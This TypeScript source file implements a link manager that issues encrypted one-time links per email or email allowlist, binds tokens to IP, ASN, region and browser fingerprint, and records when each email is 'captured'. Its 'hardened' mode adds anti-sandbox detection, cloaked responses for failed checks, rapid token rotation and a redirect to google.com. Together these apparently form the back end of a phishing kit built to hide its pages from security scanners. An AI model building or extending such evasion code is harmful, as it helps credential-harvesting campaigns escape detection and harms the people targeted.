/**
 * LINK MANAGER - Public Orchestration API
 * 
 * Phase 5: Full implementation with hardened mode support
 * 
 * This is the public API for the entire link system.
 * All API routes and other modules should use this layer.
 * 
 * Supports two security modes:
 * - strict: Standard validation (default)
 * - hardened: Red-team mode with advanced security checks
 * 
 * Follows: /PROJECT_ARCHITECTURE/LINK_ENGINE_BLUEPRINT.md
 */

import { 
  createLinkRecord,
  getLinkByToken,
  getLinkById,
  saveEmailMapping,
  getEmailByMappingId,
  tokenExists,
  markPersonalLinkUsed,
  updateGenericLinkUsage,
  activateLink,
  deactivateLink,
  type LinkRecord,
} from './linkDatabaseSql'
import { 
  encryptPayload,
  encryptPayloadV3,
  decryptToken,
  decryptTokenV3,
  normalizeToken,
  extractTokenFromUrl,
  createHardenedPayload,
  extractBrowserFamily,
  type TokenPayload,
  type TokenPayloadV3,
} from './tokenEngine'
import { 
  getSecurityMode,
  getCachedSecurityMode,
} from './adminSettings'
import { 
  canUseLink,
  isExpired as isLinkExpiredValidation,
  isUsed as isLinkUsedValidation,
  isEmailAllowed as isEmailAllowedValidation,
  hasEmailCapturedBefore,
  shouldReject,
  generateCloakedResponse,
  type SecurityContext,
} from './linkValidation'
import { randomUUID } from 'crypto'

// ============================================
// Type Definitions
// ============================================

/**
 * Token micro-rotation result
 */
export interface TokenRotationResult {
  newToken: string
  link: LinkRecord
}

// ============================================
// Helper Functions
// ============================================

/**
 * Perform token micro-rotation (hardened mode only)
 * 
 * After successful fingerprint validation, issues a new short-lived token
 * to prevent replay attacks.
 * 
 * @param originalToken Original token
 * @param link Link record
 * @param context Security context
 * @returns New token and updated link
 */
async function performTokenMicroRotation(
  originalToken: string,
  link: LinkRecord,
  context: SecurityContext
): Promise<TokenRotationResult> {
  const securityMode = await getSecurityMode()
  
  // Only in hardened mode
  if (securityMode !== 'hardened') {
    return { newToken: originalToken, link }
  }
  
  // Generate new short-lived token (4 second expiry window)
  const newPayload: TokenPayload = {
    linkId: link.id,
    email: link.email || undefined,
    expiresAt: Math.floor(Date.now() / 1000) + 4, // 4 seconds from now
    type: link.type,
  }
  
  // Add binding data if available
  const hardenedPayload = createHardenedPayload(newPayload, {
    fingerprint: context.fingerprint,
    ip: context.ip,
    asn: context.asn,
    continent: context.continent,
    region: context.region,
    browserFamily: context.browserFamily || (context.userAgent ? extractBrowserFamily(context.userAgent) : undefined),
  })
  
  // Encrypt new token
  const newToken = encryptPayload(hardenedPayload)
  
  // Update link's session_identifier with new token (but keep used = 0)
  const { sql } = await import('./sql')
  await sql.tx(async (db) => {
    sql.run(
      'UPDATE links SET session_identifier = ? WHERE id = ?',
      [newToken, link.id]
    )
  })
  
  // Get updated link
  const updatedLink = await getLinkById(link.id)
  
  return {
    newToken,
    link: updatedLink || link,
  }
}

// ============================================
// Type Definitions
// ============================================

/**
 * Options for creating a personalized link
 */
export interface CreatePersonalizedLinkOptions {
  email: string
  name?: string | null
  templateId?: string | null
  templateMode?: 'auto' | 'manual' | 'rotate' | null
  language?: string | null
  loadingScreen?: string | null
  loadingDuration?: number | null
  expiresAt: number // Unix timestamp in seconds
}

/**
 * Options for creating a generic link
 */
export interface CreateGenericLinkOptions {
  emailList: string[]
  name?: string | null
  templateId?: string | null
  templateMode?: 'auto' | 'manual' | 'rotate' | null
  language?: string | null
  loadingScreen?: string | null
  loadingDuration?: number | null
  expiresAt: number // Unix timestamp in seconds
}

/**
 * Link metadata for public consumption
 */
export interface LinkMeta {
  id: string
  type: 'personalized' | 'generic'
  status: 'active' | 'used' | 'expired' | 'deleted'
  expiresAt: number
  isExpired: boolean
  isUsed: boolean
  templateId?: string | null
  language?: string | null
}

/**
 * Validation result for personalized link usage
 */
export interface PersonalizedUsageValidation {
  valid: boolean
  link: LinkRecord | null
  reason?: string
}

/**
 * Generic link authorization result
 */
export interface GenericAuthorizationResult {
  authorized: boolean
  link: LinkRecord | null
  reason?: string
}

// ============================================
// Type A — Personalized Links
// ============================================

/**
 * Create a personalized link (Type A)
 * 
 * Process:
 * 1. Generate encrypted token with linkId and email
 * 2. Create link record in database
 * 3. Save email mapping for resolution
 * 4. Return token and link metadata
 * 
 * @param email Email address for personalized link
 * @param options Creation options
 * @param context Security context (optional, for hardened mode token binding)
 * @returns Generated token string
 */
export async function createPersonalizedLink(
  email: string,
  options: CreatePersonalizedLinkOptions,
  context?: SecurityContext
): Promise<string> {
  const securityMode = await getSecurityMode()
  
  // Generate unique link ID
  const linkId = randomUUID()
  
  // Normalize email
  const normalizedEmail = email.toLowerCase().trim()
  
  // Create base token payload
  const basePayload: Omit<TokenPayload, 'ts' | 'fingerprintHash' | 'ipBinding' | 'uaFamily'> = {
    linkId,
    email: normalizedEmail,
    expiresAt: options.expiresAt,
    type: 'personalized',
  }
  
  // For hardened mode, add binding data
  let tokenPayload: TokenPayload
  if (securityMode === 'hardened' && context) {
    tokenPayload = createHardenedPayload(basePayload, {
      fingerprint: context.fingerprint,
      ip: context.ip,
      asn: context.asn,
      continent: context.continent,
      region: context.region,
      browserFamily: context.browserFamily || (context.userAgent ? extractBrowserFamily(context.userAgent) : undefined),
    })
  } else {
    // In strict mode, use base payload with timestamp
    tokenPayload = {
      ...basePayload,
      ts: Date.now(),
    } as TokenPayload
  }
  
  // Encrypt payload with error handling
  let token: string
  try {
    token = encryptPayload(tokenPayload)
  } catch (error) {
    throw new Error(`Failed to encrypt token: ${error instanceof Error ? error.message : 'Unknown error'}`)
  }
  
  // Create link record in database
  const link = await createLinkRecord({
    type: 'personalized',
    session_identifier: token,
    link_token: token, // Legacy alias
    name: options.name || null,
    email: normalizedEmail,
    template_id: options.templateId || null,
    template_mode: options.templateMode || null,
    language: options.language || null,
    loading_screen: options.loadingScreen || null,
    loading_duration: options.loadingDuration || null,
    expires_at: options.expiresAt,
  })
  
  // Save email mapping for Type A links with rollback on failure
  const mappingId = randomUUID()
  try {
    await saveEmailMapping(mappingId, normalizedEmail, linkId)
  } catch (error) {
    // Rollback: delete created link if mapping fails
    try {
      await deactivateLink(link.id)
    } catch (rollbackError) {
      console.error('[LINK MANAGER] Failed to rollback link creation:', rollbackError)
    }
    throw new Error(`Failed to save email mapping: ${error instanceof Error ? error.message : 'Unknown error'}`)
  }
  
  return token
}

/**
 * Validate personalized link usage
 * 
 * Checks:
 * - Token is valid and decryptable
 * - Link exists and is active
 * - Link is not expired
 * - Link is not already used
 * - Email matches
 * 
 * In hardened mode:
 * - Token binding validation
 * - Millisecond-window expiry
 * - Anti-sandbox detection
 * - Token micro-rotation after validation
 * 
 * @param token Encrypted token
 * @param context Security context (required for hardened mode)
 * @returns Validation result with link record and potentially new token
 */
export async function validatePersonalizedUsage(
  token: string,
  context?: SecurityContext
): Promise<PersonalizedUsageValidation & { newToken?: string; shouldCloak?: boolean }> {
  const securityMode = await getSecurityMode()
  
  try {
    // Normalize token
    const normalized = normalizeToken(token)
    
    // Decrypt token
    const payload = decryptToken(normalized)
    
    // Get link by token
    const link = await getLinkByToken(normalized)
    
    if (!link) {
      if (securityMode === 'hardened') {
        return { valid: false, link: null, reason: 'Link not found', shouldCloak: true }
      }
      return { valid: false, link: null, reason: 'Link not found' }
    }
    
    // Validate using linkValidation
    const validation = await canUseLink(normalized, payload.email, context)
    
    if (!validation.valid) {
      return {
        valid: false,
        link: null,
        reason: validation.reason,
        shouldCloak: validation.shouldCloak,
      }
    }
    
    // Additional checks
    if (link.status !== 'active') {
      return { valid: false, link, reason: 'Link is not active' }
    }
    
    if (isLinkExpired(link)) {
      return { valid: false, link, reason: 'Link expired' }
    }
    
    if (isLinkUsedValidation(link)) {
      return { valid: false, link, reason: 'Link already used' }
    }
    
    // Email validation (if present in payload)
    if (payload.email && link.email) {
      if (payload.email.toLowerCase() !== link.email.toLowerCase()) {
        return { valid: false, link, reason: 'Email mismatch' }
      }
    }
    
    // In hardened mode, perform token micro-rotation after successful validation
    if (securityMode === 'hardened' && context) {
      try {
        const rotation = await performTokenMicroRotation(normalized, link, context)
        return {
          valid: true,
          link: rotation.link,
          newToken: rotation.newToken,
        }
      } catch (error) {
        // If rotation fails, still return valid but without new token
        return { valid: true, link }
      }
    }
    
    return { valid: true, link }
  } catch (error) {
    if (securityMode === 'hardened') {
      return {
        valid: false,
        link: null,
        reason: 'Validation failed',
        shouldCloak: true,
      }
    }
    return {
      valid: false,
      link: null,
      reason: error instanceof Error ? error.message : 'Validation failed',
    }
  }
}

/**
 * Mark a personalized link as used
 * 
 * Updates link status and records usage metadata.
 * Supports hardened mode with security context.
 * 
 * @param token Encrypted token
 * @param fingerprint Device fingerprint
 * @param ip IP address
 * @param context Security context (optional, for hardened mode)
 */
export async function markPersonalizedUsed(
  token: string,
  fingerprint: string,
  ip: string,
  context?: SecurityContext
): Promise<void> {
  const securityMode = await getSecurityMode()
  
  try {
    // Normalize token
    const normalized = normalizeToken(token)
    
    // In hardened mode, validate first
    if (securityMode === 'hardened' && context) {
      const validation = await validatePersonalizedUsage(normalized, context)
      if (!validation.valid) {
        if (validation.shouldCloak) {
          throw new Error('CLOAK_REQUIRED')
        }
        throw new Error(validation.reason || 'Validation failed')
      }
      
      // Use new token if micro-rotation occurred
      if (validation.newToken) {
        await markPersonalLinkUsed(validation.newToken, fingerprint, ip)
        return
      }
    }
    
    // Mark link as used
    await markPersonalLinkUsed(normalized, fingerprint, ip)
  } catch (error) {
    if (securityMode === 'hardened' && error instanceof Error && error.message === 'CLOAK_REQUIRED') {
      throw error
    }
    throw error
  }
}

// ============================================
// Type B — Generic Links
// ============================================

/**
 * Create a generic link (Type B)
 * 
 * Process:
 * 1. Generate encrypted token with linkId
 * 2. Create link record in database
 * 3. Save email allowlist
 * 4. Return token and link metadata
 * 
 * @param emailList List of allowed email addresses
 * @param options Creation options
 * @param context Security context (optional, for hardened mode token binding)
 * @returns Generated token string
 */
export async function createGenericLink(
  emailList: string[],
  options: CreateGenericLinkOptions,
  context?: SecurityContext
): Promise<string> {
  const securityMode = await getSecurityMode()
  
  // Generate unique link ID
  const linkId = randomUUID()
  
  // Normalize email list
  const normalizedEmails = emailList.map(e => e.toLowerCase().trim()).filter(e => e.length > 0)
  const totalEmails = normalizedEmails.length
  
  if (totalEmails === 0) {
    throw new Error('Email list cannot be empty')
  }
  
  // Create base token payload
  const basePayload: Omit<TokenPayload, 'ts' | 'fingerprintHash' | 'ipBinding' | 'uaFamily'> = {
    linkId,
    expiresAt: options.expiresAt,
    type: 'generic',
  }
  
  // For hardened mode, add binding data
  let tokenPayload: TokenPayload
  if (securityMode === 'hardened' && context) {
    tokenPayload = createHardenedPayload(basePayload, {
      fingerprint: context.fingerprint,
      ip: context.ip,
      asn: context.asn,
      continent: context.continent,
      region: context.region,
      browserFamily: context.browserFamily || (context.userAgent ? extractBrowserFamily(context.userAgent) : undefined),
    })
  } else {
    // In strict mode, use base payload as-is (it already has all required fields)
    tokenPayload = {
      ...basePayload,
    } as TokenPayload
  }
  
  // Encrypt payload
  const token = encryptPayload(tokenPayload)
  
  // Create link record in database
  const link = await createLinkRecord({
    type: 'generic',
    session_identifier: token,
    link_token: token, // Legacy alias
    name: options.name || null,
    template_id: options.templateId || null,
    template_mode: options.templateMode || null,
    language: options.language || null,
    loading_screen: options.loadingScreen || null,
    loading_duration: options.loadingDuration || null,
    expires_at: options.expiresAt,
    total_emails: totalEmails,
  })
  
  // Save email allowlist entries
  const { sql } = await import('./sql')
  const now = Math.floor(Date.now() / 1000) // Unix timestamp in seconds
  
  await sql.tx(async (db) => {
    for (const email of normalizedEmails) {
      sql.run(
        'INSERT INTO email_allowlists (link_id, email, created_at, captured) VALUES (?, ?, ?, ?)',
        [linkId, email, now, 0]
      )
    }
  })
  
  return token
}

/**
 * Check if email is authorized for generic link
 * 
 * Validates:
 * - Token is valid and decryptable
 * - Link exists and is active
 * - Link is not expired
 * - Email is in allowlist
 * - Email hasn't been used before
 * 
 * In hardened mode:
 * - Token binding validation
 * - Millisecond-window expiry
 * - Anti-sandbox detection
 * - Token micro-rotation after validation
 * 
 * @param token Encrypted token
 * @param email Email address to check
 * @param context Security context (required for hardened mode)
 * @returns Authorization result with link record and potentially new token
 */
export async function checkGenericAuthorization(
  token: string,
  email: string,
  context?: SecurityContext
): Promise<GenericAuthorizationResult & { newToken?: string; shouldCloak?: boolean }> {
  const securityMode = await getSecurityMode()
  
  try {
    // Normalize token
    const normalized = normalizeToken(token)
    
    // Decrypt token
    const payload = decryptToken(normalized)
    
    // Get link by token
    const link = await getLinkByToken(normalized)
    
    if (!link) {
      if (securityMode === 'hardened') {
        return { authorized: false, link: null, reason: 'Link not found', shouldCloak: true }
      }
      return { authorized: false, link: null, reason: 'Link not found' }
    }
    
    // Validate using linkValidation
    const validation = await canUseLink(normalized, email, context)
    
    if (!validation.valid) {
      return {
        authorized: false,
        link: null,
        reason: validation.reason,
        shouldCloak: validation.shouldCloak,
      }
    }
    
    // Additional checks
    if (link.status !== 'active') {
      return { authorized: false, link, reason: 'Link is not active' }
    }
    
    if (isLinkExpired(link)) {
      return { authorized: false, link, reason: 'Link expired' }
    }
    
    // Check email in allowlist
    const emailAllowed = await isEmailAllowed(link, email)
    if (!emailAllowed) {
      return { authorized: false, link, reason: 'Email not in allowlist' }
    }
    
    // Check if email already captured
    const alreadyCaptured = await hasEmailCapturedBefore(normalized, email)
    if (alreadyCaptured) {
      return { authorized: false, link, reason: 'Email already used this link' }
    }
    
    // In hardened mode, perform token micro-rotation after successful validation
    if (securityMode === 'hardened' && context) {
      try {
        const rotation = await performTokenMicroRotation(normalized, link, context)
        return {
          authorized: true,
          link: rotation.link,
          newToken: rotation.newToken,
        }
      } catch (error) {
        // If rotation fails, still return authorized but without new token
        return { authorized: true, link }
      }
    }
    
    return { authorized: true, link }
  } catch (error) {
    if (securityMode === 'hardened') {
      return {
        authorized: false,
        link: null,
        reason: 'Authorization failed',
        shouldCloak: true,
      }
    }
    return {
      authorized: false,
      link: null,
      reason: error instanceof Error ? error.message : 'Authorization failed',
    }
  }
}

/**
 * Record generic link usage
 * 
 * Updates link statistics and marks email as captured.
 * Supports hardened mode with security context.
 * 
 * @param token Encrypted token
 * @param email Email address that used the link
 * @param fingerprint Device fingerprint
 * @param ip IP address
 * @param context Security context (optional, for hardened mode)
 */
export async function recordGenericUsage(
  token: string,
  email: string,
  fingerprint: string,
  ip: string,
  context?: SecurityContext
): Promise<void> {
  const securityMode = await getSecurityMode()
  
  try {
    // Normalize token
    const normalized = normalizeToken(token)
    
    // Validate authorization first
    const authResult = await checkGenericAuthorization(normalized, email, context)
    
    if (!authResult.authorized) {
      if (securityMode === 'hardened' && authResult.shouldCloak) {
        // In hardened mode, don't throw - let caller handle cloaking
        throw new Error('CLOAK_REQUIRED')
      }
      throw new Error(authResult.reason || 'Not authorized')
    }
    
    // Update generic link usage
    await updateGenericLinkUsage(normalized, email, fingerprint, ip)
  } catch (error) {
    if (securityMode === 'hardened' && error instanceof Error && error.message === 'CLOAK_REQUIRED') {
      // Re-throw for cloaking
      throw error
    }
    throw error
  }
}

// ============================================
// Shared / Utility Functions
// ============================================

/**
 * Resolve token from URL
 * 
 * Extracts and normalizes token from various URL formats.
 * Supports hardened mode with additional validation.
 * 
 * @param requestUrl Request URL string
 * @param context Security context (optional, for hardened mode)
 * @returns Normalized token or null if not found
 */
export async function resolveTokenFromUrl(
  requestUrl: string,
  context?: SecurityContext
): Promise<string | null> {
  const securityMode = await getSecurityMode()
  
  // Extract token from URL
  let token = extractTokenFromUrl(requestUrl)
  
  if (!token) {
    return null
  }
  
  // Normalize token
  try {
    token = normalizeToken(token)
  } catch (error) {
    // In hardened mode, cloak the error
    if (securityMode === 'hardened') {
      return null // Return null instead of throwing
    }
    throw error
  }
  
  // In hardened mode, validate token format
  if (securityMode === 'hardened') {
    const { isValidTokenFormat } = await import('./tokenEngine')
    if (!isValidTokenFormat(token)) {
      return null
    }
  }
  
  return token
}

/**
 * Get link metadata
 * 
 * Returns public metadata about a link without sensitive data.
 * 
 * @param token Encrypted token
 * @param context Security context (optional, for hardened mode)
 * @returns Link metadata or null if not found
 */
export async function getLinkMeta(
  token: string,
  context?: SecurityContext
): Promise<LinkMeta | null> {
  const securityMode = await getSecurityMode()
  
  try {
    // Normalize token
    const normalized = normalizeToken(token)
    
    // Decrypt token
    const payload = decryptToken(normalized)
    
    // Get link by token
    const link = await getLinkByToken(normalized)
    
    if (!link) {
      return null
    }
    
    // Return metadata
    return {
      id: link.id,
      type: link.type,
      status: link.status,
      expiresAt: link.expires_at,
      isExpired: isLinkExpired(link),
      isUsed: isLinkUsedValidation(link),
      templateId: link.template_id,
      language: link.language,
    }
  } catch (error) {
    // In hardened mode, cloak errors
    if (securityMode === 'hardened') {
      return null
    }
    throw error
  }
}

/**
 * Get expiration status of a link
 * 
 * @param link Link record
 * @returns Expiration status information
 */
export function getExpirationStatus(link: LinkRecord): {
  isExpired: boolean
  expiresAt: number
  expiresIn: number // seconds until expiration
} {
  const now = Math.floor(Date.now() / 1000) // Unix timestamp in seconds
  const isExpired = link.expires_at < now
  const expiresIn = Math.max(0, link.expires_at - now)
  
  return {
    isExpired,
    expiresAt: link.expires_at,
    expiresIn,
  }
}

/**
 * Check if link is expired
 * 
 * @param link Link record
 * @returns true if expired, false otherwise
 */
export function isLinkExpired(link: LinkRecord): boolean {
  return isLinkExpiredValidation(link)
}

/**
 * Check if email is allowed for a link
 * 
 * For Type A: checks if email matches
 * For Type B: checks if email is in allowlist
 * 
 * @param link Link record
 * @param email Email address to check
 * @returns true if allowed, false otherwise
 */
export async function isEmailAllowed(link: LinkRecord, email: string): Promise<boolean> {
  return await isEmailAllowedValidation(link, email)
}

/**
 * Sanitize return URL with hardened mode support
 * 
 * Validates and sanitizes redirect URLs to prevent open redirects.
 * In hardened mode, adds random padding parameters.
 * 
 * @param url URL to sanitize
 * @param context Security context (for hardened mode)
 * @returns Sanitized URL or default safe URL
 */
export function sanitizeReturnUrl(
  url: string | null | undefined,
  context?: { securityMode?: 'strict' | 'hardened' }
): string {
  const securityMode = context?.securityMode || getCachedSecurityMode()
  const defaultUrl = 'https://www.google.com'
  
  if (!url || typeof url !== 'string') {
    return defaultUrl
  }
  
  // Remove whitespace
  url = url.trim()
  
  // Prevent dangerous protocols
  const dangerousProtocols = ['javascript:', 'data:', 'file:', 'vbscript:', 'about:']
  for (const protocol of dangerousProtocols) {
    if (url.toLowerCase().startsWith(protocol)) {
      return defaultUrl
    }
  }
  
  // Validate URL format
  let parsedUrl: URL
  try {
    parsedUrl = new URL(url)
  } catch {
    return defaultUrl
  }
  
  // Only allow http/https
  if (parsedUrl.protocol !== 'http:' && parsedUrl.protocol !== 'https:') {
    return defaultUrl
  }
  
  // In hardened mode, add random padding parameters
  if (securityMode === 'hardened') {
    const random1 = Math.random().toString(36).substring(2, 8)
    const random2 = Math.random().toString(36).substring(2, 8)
    const random3 = Math.random().toString(36).substring(2, 8)
    
    const separator = parsedUrl.search ? '&' : '?'
    url = `${url}${separator}s1=${random1}&s2=${random2}&u=${random3}`
    
    // Re-parse to ensure valid URL
    try {
      parsedUrl = new URL(url)
    } catch {
      return defaultUrl
    }
  }
  
  // In production, add domain allowlist check here
  // For now, return the sanitized URL
  return url
}

